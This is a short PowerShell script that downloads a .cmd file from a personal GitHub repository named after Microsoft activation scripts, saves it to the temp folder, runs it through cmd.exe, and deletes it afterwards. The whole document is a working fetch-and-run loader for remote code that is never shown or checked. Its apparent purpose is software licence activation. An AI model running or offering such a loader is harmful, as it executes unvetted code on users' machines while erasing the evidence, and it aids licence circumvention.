$url = "https://raw.githubusercontent.com/neogenex46/Microsoft-Activation-Scripts/refs/heads/main/NEOGENEX_SCRIPT.cmd"
$path = "$env:TEMP\NEOGENEX_SCRIPT.cmd"
Invoke-WebRequest -Uri $url -OutFile $path
Start-Process "cmd.exe" -ArgumentList "/k $path"
Remove-Item $path
